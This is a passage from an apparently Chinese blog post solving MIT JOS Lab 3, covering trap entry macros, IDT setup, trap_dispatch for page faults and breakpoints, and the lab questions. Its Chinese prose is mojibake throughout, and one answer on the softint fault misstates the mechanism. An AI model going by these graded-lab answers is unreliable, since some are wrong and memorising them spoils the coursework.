class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">* TRAPHANDLER defines a globally-visible function <span class="hljs-keyword">for</span> handling a trap.<br> * It pushes a trap number onto the <span class="hljs-built_in">stack</span>, then jumps to _alltraps.<br> * Use TRAPHANDLER <span class="hljs-keyword">for</span> traps where the CPU automatically pushes an error code.<br> *<br> * You shouldn<span class="hljs-number">&#x27;</span>t call a TRAPHANDLER function from C, but you may<br> * need to _declare_ one in <span class="hljs-title function_">C</span> <span class="hljs-params">(<span class="hljs-keyword">for</span> instance, to get a function pointer</span><br><span class="hljs-params"> * during IDT setup)</span>.  You can declare the function with<br> *   <span class="hljs-type">void</span> <span class="hljs-title function_">NAME</span><span class="hljs-params">()</span>;<br> * where NAME is the argument passed to TRAPHANDLER.<br> */<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRAPHANDLER(name, num)\</span><br><span class="hljs-meta">.globl name;<span class="hljs-comment">/* define global symbol for &#x27;name&#x27; */</span>\</span><br><span class="hljs-meta">.type name, @function;<span class="hljs-comment">/* symbol type is function */</span>\</span><br><span class="hljs-meta">.align 2;<span class="hljs-comment">/* align function definition */</span>\</span><br><span class="hljs-meta">name:<span class="hljs-comment">/* function starts here */</span>\</span><br><span class="hljs-meta">pushl $(num);\</span><br><span class="hljs-meta">jmp _alltraps</span><br><br><span class="hljs-comment">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn&#x27;t push an error code.</span><br><span class="hljs-comment"> * It pushes a 0 in place of the error code, so the trap frame has the same</span><br><span class="hljs-comment"> * format in either case.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRAPHANDLER_NOEC(name, num)\</span><br><span class="hljs-meta">.globl name;\</span><br><span class="hljs-meta">.type name, @function;\</span><br><span class="hljs-meta">.align 2;\</span><br><span class="hljs-meta">name:\</span><br><span class="hljs-meta">pushl $0;\</span><br><span class="hljs-meta">pushl $(num);\</span><br><span class="hljs-meta">jmp _alltraps</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå‚ç…§ <code>inc/trap.h</code> ä¸­æä¾›çš„ <code>T_*</code> å®å£°æ˜å¯¹åº”å…¥å£ç‚¹ï¼Œå¯¹äºä¼šæœ‰ error code çš„ä¸­æ–­ä½¿ç”¨ <code>TRAPHANDLER</code> å®ï¼Œå¦åˆ™ä½¿ç”¨</p><p><code>TRAPHANDLER_NOEC</code> å®ï¼Œæ˜¯å¦æœ‰ error code å‚è§ä¸Šé¢çš„è¡¨æ ¼ï¼›å®é‡Œçš„ <code>name</code> å­—æ®µå¥½åƒæ˜¯å¯ä»¥éšæ„å£°æ˜çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Lab 3: Your code here for generating entry points for the different traps.</span><br><span class="hljs-comment"> */</span><br>TRAPHANDLER_NOEC(int0, T_DIVIDE)<br>TRAPHANDLER_NOEC(int1, T_DEBUG)<br>TRAPHANDLER_NOEC(int2, T_NMI)<br>TRAPHANDLER_NOEC(int3, T_BRKPT)<br>TRAPHANDLER_NOEC(int4, T_OFLOW)<br>TRAPHANDLER_NOEC(int5, T_BOUND)<br>TRAPHANDLER_NOEC(int6, T_ILLOP)<br>TRAPHANDLER_NOEC(int7, T_DEVICE)<br>TRAPHANDLER(int8, T_DBLFLT)<br><br>TRAPHANDLER(int10, T_TSS)<br>TRAPHANDLER(int11, T_SEGNP)<br>TRAPHANDLER(int12, T_STACK)<br>TRAPHANDLER(int13, T_GPFLT)<br>TRAPHANDLER(int14, T_PGFLT)<br><br>TRAPHANDLER_NOEC(int16, T_FPERR)<br>TRAPHANDLER_NOEC(__syscall, T_SYSCALL)<br></code></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯å®ç° <code>_alltraps</code>ï¼ŒæŒ‰æ³¨é‡Šæˆ‘ä»¬åº”å½“å‘æ ˆä¸Šå‹å…¥å¯¹åº”æ•°æ®å½¢æˆä¸€ä¸ª <code>Trapframe</code> ç»“æ„ä½“ï¼Œå®é™…ä¸Šåªéœ€è¦æ¨å…¥ esã€dsã€<code>PushRegs</code> ç»“æ„ä½“ï¼Œå‰©ä½™çš„éƒ½ä¼šåœ¨æˆ‘ä»¬è¿è¡Œåˆ° <code>_alltraps</code> å‰è¢«å‹å…¥æ ˆä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PushRegs</span> &#123;</span><br><span class="hljs-comment">/* registers as pushed by pusha */</span><br><span class="hljs-type">uint32_t</span> reg_edi;<br><span class="hljs-type">uint32_t</span> reg_esi;<br><span class="hljs-type">uint32_t</span> reg_ebp;<br><span class="hljs-type">uint32_t</span> reg_oesp;<span class="hljs-comment">/* Useless */</span><br><span class="hljs-type">uint32_t</span> reg_ebx;<br><span class="hljs-type">uint32_t</span> reg_edx;<br><span class="hljs-type">uint32_t</span> reg_ecx;<br><span class="hljs-type">uint32_t</span> reg_eax;<br>&#125; __attribute__((packed));<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Trapframe</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PushRegs</span> <span class="hljs-title">tf_regs</span>;</span><br><span class="hljs-type">uint16_t</span> tf_es;<br><span class="hljs-type">uint16_t</span> tf_padding1;<br><span class="hljs-type">uint16_t</span> tf_ds;<br><span class="hljs-type">uint16_t</span> tf_padding2;<br><span class="hljs-type">uint32_t</span> tf_trapno;<br><span class="hljs-comment">/* below here defined by x86 hardware */</span><br><span class="hljs-type">uint32_t</span> tf_err;<br><span class="hljs-type">uintptr_t</span> tf_eip;<br><span class="hljs-type">uint16_t</span> tf_cs;<br><span class="hljs-type">uint16_t</span> tf_padding3;<br><span class="hljs-type">uint32_t</span> tf_eflags;<br><span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br><span class="hljs-type">uintptr_t</span> tf_esp;<br><span class="hljs-type">uint16_t</span> tf_ss;<br><span class="hljs-type">uint16_t</span> tf_padding4;<br>&#125; __attribute__((packed));<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ padding å…¶å®ä¸éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å‹å…¥æ ˆä¸Šï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>pushl</code> æŒ‡ä»¤å‹å…¥ ds ä¸ es æ—¶ä»–ä»¬ä¼šè‡ªåŠ¨æ‰©å±•ä¸º 4 å­—èŠ‚ï¼›ä¹‹åæˆ‘ä»¬è¿˜éœ€è¦å°† ds ä¸ es çš„å€¼è®¾ä¸º <code>GD_KD</code>ï¼Œæœ€åå‹å…¥ esp åæ‰‹åŠ¨è°ƒç”¨ <code>trap()</code> å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Lab 3: Your code here for _alltraps</span><br><span class="hljs-comment"> */</span><br><br>_alltraps:<br>pushl %ds<br>pushl %es<br>pushal<br>push $GD_KD<br>popl %ds<br>push $GD_KD<br>popl %es<br>pushl %esp<br>call trap<br></code></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨ <code>SETGATE</code> å®åœ¨ <code>trap_init()</code> ä¸­è£…è½½ä¸­æ–­æè¿°ç¬¦ï¼Œå…¶æ¥æ”¶çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª <code>Gatedesc</code> ç±»å‹ç»“æ„ä½“ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªé—¨æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Gate descriptors for interrupts and traps</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Gatedesc</span> &#123;</span><br><span class="hljs-type">unsigned</span> gd_off_15_0 : <span class="hljs-number">16</span>;   <span class="hljs-comment">// low 16 bits of offset in segment</span><br><span class="hljs-type">unsigned</span> gd_sel : <span class="hljs-number">16</span>;        <span class="hljs-comment">// segment selector</span><br><span class="hljs-type">unsigned</span> gd_args : <span class="hljs-number">5</span>;        <span class="hljs-comment">// # args, 0 for interrupt/trap gates</span><br><span class="hljs-type">unsigned</span> gd_rsv1 : <span class="hljs-number">3</span>;        <span class="hljs-comment">// reserved(should be zero I guess)</span><br><span class="hljs-type">unsigned</span> gd_type : <span class="hljs-number">4</span>;        <span class="hljs-comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span><br><span class="hljs-type">unsigned</span> gd_s : <span class="hljs-number">1</span>;           <span class="hljs-comment">// must be 0 (system)</span><br><span class="hljs-type">unsigned</span> gd_dpl : <span class="hljs-number">2</span>;         <span class="hljs-comment">// descriptor(meaning new) privilege level</span><br><span class="hljs-type">unsigned</span> gd_p : <span class="hljs-number">1</span>;           <span class="hljs-comment">// Present</span><br><span class="hljs-type">unsigned</span> gd_off_31_16 : <span class="hljs-number">16</span>;  <span class="hljs-comment">// high bits of offset in segment</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸º<strong>æˆ‘ä»¬è¿˜æ²¡æœ‰å®šä¹‰ä»»ä½•å¤„ç†å‡½æ•°æ‰€ä»¥ç›´æ¥å£°æ˜æ–°çš„å‡½æ•°å³å¯</strong>ï¼Œç°åœ¨è¿˜æ²¡æœ‰å‡ºç°é™·é˜±æ‰€ä»¥éƒ½æ˜¯æ™®é€šçš„ä¸­æ–­ï¼Œè¿™é‡Œæ³¨æ„ç³»ç»Ÿè°ƒç”¨ä¸è°ƒè¯•ä¸­æ–­çš„ç‰¹æƒçº§åº”è®¾ä¸º3ï¼Œå› ä¸ºç”¨æˆ·è¿›ç¨‹éœ€è¦èƒ½å¤Ÿè®¿é—®å…¶å…¥å£ç‚¹ï¼š</p><blockquote><p>ä¸€å¼€å§‹ç¬”è€…åœ¨æƒ³ï¼Œå¥½åƒè¿˜æ²¡æœ‰å‡½æ•°å®šä¹‰å•Šï¼Œåé¢çœ‹äº†ä¸€çœ¼åˆ«äººçš„å®éªŒæŠ¥å‘Šï¼Œç›´æ¥å£°æ˜æ–°çš„å‡½æ•°ï¼Œè¿˜æ²¡æœ‰å‡½æ•°ä½“ï¼Œå±å®ä½©æœâ€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">trap_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Segdesc</span> <span class="hljs-title">gdt</span>[];</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// declaration</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">int0</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int1</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int2</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int3</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int4</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int5</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int6</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int7</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int8</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">int10</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int11</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int12</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int13</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int14</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">int16</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __syscall()<br>&#123;<br>cprintf(<span class="hljs-string">&quot;syscall!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// set up IDT</span><br>SETGATE(idt[T_DIVIDE], <span class="hljs-number">0</span>, GD_KT, int0, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DEBUG], <span class="hljs-number">0</span>, GD_KT, int1, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_NMI], <span class="hljs-number">0</span>, GD_KT, int2, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_BRKPT], <span class="hljs-number">0</span>, GD_KT, int3, <span class="hljs-number">3</span>);<br>SETGATE(idt[T_OFLOW], <span class="hljs-number">0</span>, GD_KT, int4, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_BOUND], <span class="hljs-number">0</span>, GD_KT, int5, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_ILLOP], <span class="hljs-number">0</span>, GD_KT, int6, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DEVICE], <span class="hljs-number">0</span>, GD_KT, int7, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DBLFLT], <span class="hljs-number">0</span>, GD_KT, int8, <span class="hljs-number">0</span>);<br><br>SETGATE(idt[T_TSS], <span class="hljs-number">0</span>, GD_KT, int10, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_SEGNP], <span class="hljs-number">0</span>, GD_KT, int11, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_STACK], <span class="hljs-number">0</span>, GD_KT, int12, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_GPFLT], <span class="hljs-number">0</span>, GD_KT, int13, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_PGFLT], <span class="hljs-number">0</span>, GD_KT, int14, <span class="hljs-number">0</span>);<br><br>SETGATE(idt[T_FPERR], <span class="hljs-number">0</span>, GD_KT, int16, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_SYSCALL], <span class="hljs-number">0</span>, GD_KT, __syscall, <span class="hljs-number">3</span>);<br><br><span class="hljs-comment">// Per-CPU setup </span><br>trap_init_percpu();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¬”è€…å°† syscall å®šä¹‰ä¸ºä¸€ä¸ªæ‰“å°å‡½æ•°ï¼Œè¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼ŒæˆåŠŸé€šè¿‡ä¸­æ–­é—¨å®Œæˆäº†ç³»ç»Ÿè°ƒç”¨ï¼š</p><p><img src="https://s2.loli.net/2022/03/17/O9Y6lED152vKHIZ.png" alt="image.png"></p><p>å½“ç„¶ï¼Œåé¢ panic æ‰äº†ï¼Œå› ä¸ºæˆ‘ä»¬çš„ä¸­æ–­å¤„ç†ç¨‹åºæ²¡æœ‰å®Œæˆ</p><blockquote><p>è¿™ä¸ªæ—¶å€™è¿è¡Œè¯„åˆ†ç¨‹åºåº”å½“æœ‰ 30 åˆ†</p></blockquote><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ Challengeï¼Œè®©æˆ‘ä»¬è‡ªåŠ¨åŒ–ç”Ÿæˆä¸€ä¸ª tableï¼š</p><blockquote><p><em>Challenge!</em> You probably have a lot of very similar code right now, between the lists of <code>TRAPHANDLER</code> in <code>trapentry.S</code> and their installations in <code>trap.c</code>. Clean this up. Change the macros in <code>trapentry.S</code> to automatically generate a table for <code>trap.c</code> to use. Note that you can switch between laying down code and data in the assembler by using the directives <code>.text</code> and <code>.data</code>.</p></blockquote><p><s>ä¸ä¼šåšï¼Œæ‘¸äº†</s></p><p>æœ€åæ˜¯ä¹ é¢˜ Timeï¼š</p><blockquote><p><strong>Questions</strong></p><p>Answer the following questions in your <code>answers-lab3.txt</code>:</p><ol><li><p>What is the purpose of having an individual handler function for each exception/interrupt? (i.e., if all exceptions/interrupts were delivered to the same handler, what feature that exists in the current implementation could not be provided?)</p><p>ç¬”è€…åªèƒ½æƒ³åˆ°æ˜¯ä¸ºäº†é™ä½ä»£ç çš„è€¦åˆæ€§ï¼Œå› ä¸ºå…¶å®å¹¶éæ˜¯ä¸èƒ½å…¨éƒ¨é€šè¿‡åŒä¸€å‡½æ•°å®ç°ä¸­æ–­å¤„ç†ï¼Œåªä¸è¿‡æ˜¯æŠŠå„ä¸ªä¸­æ–­å¤„ç†ç¨‹åºå¡åˆ°ä¸­æ–­å…¥å£ç‚¹é‡Œç½¢äº†</p></li><li><p>Did you have to do anything to make the <code>user/softint</code> program behave correctly? The grade script expects it to produce a general protection fault (trap 13), but <code>softint</code>â€™s code says <code>int $14</code>. <em>Why</em> should this produce interrupt vector 13? What happens if the kernel actually allows <code>softint</code>â€™s <code>int $14</code> instruction to invoke the kernelâ€™s page fault handler (which is interrupt vector 14)?</p><p>å› ä¸º General Protection Fault å±äº 0 ç‰¹æƒçº§ï¼Œç”¨æˆ·æ€æ— æƒé™è§¦å‘ï¼Œå› æ­¤åœ¨è®¿é—®å…¶å‘é‡æ—¶ä¼šè§¦å‘ Page Fault</p></li></ol></blockquote><p>æ¥ä¸‹æ¥è¿›å…¥ Part Bï¼Œç»§ç»­å®Œå–„æˆ‘ä»¬çš„ä¸­æ–­å¤„ç†ç¨‹åº</p><h2 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls">Part B: Page Faults, Breakpoints Exceptions, and System Calls</h2><p>æœ¬èŠ‚ä¸­æˆ‘ä»¬å°†æ”¹è¿›ä¸­æ–­å¤„ç†ä»£ç ä»¥å®ç°ä¸€äº›éœ€è¦é€šè¿‡å¼‚å¸¸å¤„ç†å®ç°çš„é‡è¦çš„åŸè¯­</p><h3 id="Handling-Page-Faults">Handling Page Faults</h3><p>ç¼ºé¡µå¼‚å¸¸æ˜¯ä¸€ä¸ªååˆ†é‡è¦çš„æœºåˆ¶ï¼Œå‡ºäºæ€§èƒ½çš„è€ƒè™‘ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦åœ¨ä¸€å¼€å§‹å°±ä¸ºå¯¹åº”çº¿æ€§åœ°å€åˆ†é…ç‰©ç†é¡µï¼Œè€Œå¯ä»¥åœ¨è®¿é—®åˆ°ä»–ä»¬æ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸åå†åˆ†é…ç‰©ç†é¡µï¼ˆä¾‹å¦‚ mmap æ˜ å°„åŒºåŸŸï¼‰</p><p>å½“è§¦å‘ç¼ºé¡µå¼‚å¸¸æ—¶ï¼Œå¤„ç†å™¨ä¼šå°†é€ æˆç¼ºé¡µå¼‚å¸¸çš„çº¿æ€§åœ°å€å­˜æ”¾åœ¨ cr2 å¯„å­˜å™¨ä¸­ï¼ŒJOS æä¾›äº†ä¸€ä¸ªç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•° <code>page_fault_handler()</code>ï¼Œåœ¨æ¥ä¸‹æ¥çš„ Exercise 5 ä¸­æˆ‘ä»¬éœ€è¦ä¿®æ”¹ <code>trap_dispatch()</code> ä»¥å¤„ç†ç¼ºé¡µå¼‚å¸¸</p><blockquote><p><strong>Exercise 5.</strong> Modify <code>trap_dispatch()</code> to dispatch page fault exceptions to <code>page_fault_handler()</code>. You should now be able to get make grade to succeed on the <code>faultread</code>, <code>faultreadkernel</code>, <code>faultwrite</code>, and <code>faultwritekernel</code> tests. If any of them donâ€™t work, figure out why and fix them. Remember that you can boot JOS into a particular user program using make run-<em>x</em> or make run-<em>x</em>-nox. For instance, make run-hello-nox runs the <em>hello</em> user program.</p></blockquote><p>ç¬”è€…ç›´æ¥ç”¨ä¸€ä¸ªå¤§çš„ switch è¿›è¡Œæ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">trap_dispatch</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-comment">// Handle processor exceptions.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">switch</span>(tf-&gt;tf_trapno)<br>&#123;<br><span class="hljs-keyword">case</span> T_DIVIDE:<br><span class="hljs-keyword">case</span> T_DEBUG:<br><span class="hljs-keyword">case</span> T_NMI:<br><span class="hljs-keyword">case</span> T_BRKPT:<br><span class="hljs-keyword">case</span> T_OFLOW:<br><span class="hljs-keyword">case</span> T_BOUND:<br><span class="hljs-keyword">case</span> T_ILLOP:<br><span class="hljs-keyword">case</span> T_DEVICE:<br><span class="hljs-keyword">case</span> T_DBLFLT:<br><span class="hljs-keyword">case</span> T_TSS:<br><span class="hljs-keyword">case</span> T_SEGNP:<br><span class="hljs-keyword">case</span> T_STACK:<br><span class="hljs-keyword">case</span> T_GPFLT:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> T_PGFLT:<br>page_fault_handler(tf);<br><span class="hljs-keyword">return</span> ;<br><span class="hljs-keyword">case</span> T_FPERR:<br><span class="hljs-keyword">case</span> T_ALIGN:<br><span class="hljs-keyword">case</span> T_MCHK:<br><span class="hljs-keyword">case</span> T_SIMDERR:<br><span class="hljs-keyword">case</span> T_SYSCALL:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Unexpected trap: The user process or the kernel has a bug.</span><br>print_trapframe(tf);<br><span class="hljs-keyword">if</span> (tf-&gt;tf_cs == GD_KT)<br>panic(<span class="hljs-string">&quot;unhandled trap in kernel&quot;</span>);<br><span class="hljs-keyword">else</span> &#123;<br>env_destroy(curenv);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¯„åˆ†ç¨‹åºï¼ŒæˆåŠŸé€šè¿‡ç¼ºé¡µå¼‚å¸¸éƒ¨åˆ†ï¼š</p><p><img src="https://s2.loli.net/2022/03/17/6CYuBxpQh5njEvP.png" alt="image.png"></p><h3 id="The-Breakpoint-Exception">The Breakpoint Exception</h3><p>æ–­ç‚¹å¼‚å¸¸é€šå¸¸è¢«ç”¨äºè°ƒè¯•ç¨‹åºï¼Œè°ƒè¯•åŸç†æ˜¯å°†ç¨‹åºä¸­å¯¹åº”æŒ‡ä»¤æ›¿æ¢ä¸º int3 è½¯ä¸­æ–­ï¼›åœ¨ JOS ä¸­æˆ‘ä»¬å°†å…¶è½¬åŒ–ä¸ºä»»ä½•ç”¨æˆ·ç¯å¢ƒéƒ½å¯ä»¥å”¤é†’ä¸€ä¸ª JOS kernel monitor çš„ä¸€ä¸ªâ€œä¼ªç³»ç»Ÿè°ƒç”¨â€</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 6ï¼Œè¡¥å®Œ <code>trap_dispatch()</code> ä½¿å¾—æ–­ç‚¹å¼‚å¸¸èƒ½å”¤èµ·ä¸€ä¸ª kernel monitor</p><blockquote><p><strong>Exercise 6.</strong> Modify <code>trap_dispatch()</code> to make breakpoint exceptions invoke the kernel monitor. You should now be able to get make grade to succeed on the <code>breakpoint</code> test.</p></blockquote><p>ç®€å•ä¿®æ”¹ä¸€ä¸‹ä¹‹å‰çš„å¤§ switch å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> T_BRKPT:<br>monitor(tf);<br><span class="hljs-keyword">return</span> ;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶åº”è¯¥èƒ½é€šè¿‡ grade ä¸­çš„æ–­ç‚¹è¯„åˆ†</p><p><img src="https://s2.loli.net/2022/03/17/sJYUfEvIPtBrdFo.png" alt="image.png"></p><p>æ¥ä¸‹æ¥åˆæ˜¯ Challengeï¼Œå®Œæˆå•æ­¥è°ƒè¯•å™¨ï¼š</p><blockquote><p><em>Challenge!</em> Modify the JOS kernel monitor so that you can â€˜continueâ€™ execution from the current location (e.g., after the <code>int3</code>, if the kernel monitor was invoked via the breakpoint exception), and so that you can single-step one instruction at a time. You will need to understand certain bits of the <code>EFLAGS</code> register in order to implement single-stepping.</p><p><em>Optional:</em> If youâ€™re feeling really adventurous, find some x86 disassembler source code - e.g., by ripping it out of QEMU, or out of GNU binutils, or just write it yourself - and extend the JOS kernel monitor to be able to disassemble and display instructions as you are stepping through them. Combined with the symbol table loading from lab 1, this is the stuff of which real kernel debuggers are made.</p></blockquote><p><s>é—²å‡ºå±æ¥æ‰æœ‰æ—¶é—´å»åšè¿™ç©æ„ï¼ŒğŸ‘´å¿™ç€å‘¢</s></p><p>ä¹‹åæ˜¯ä¹ é¢˜ Timeï¼š</p><blockquote><p><strong>Questions</strong></p><ol><li><p>The break point test case will either generate a break point exception or a general protection fault depending on how you initialized the break point entry in the IDT (i.e., your call to <code>SETGATE</code> from <code>trap_init</code>). Why? How do you need to set it up in order to get the breakpoint exception to work as specified above and what incorrect setup would cause it to trigger a general protection fault?</p><p>è¿™å–å†³äº IDT 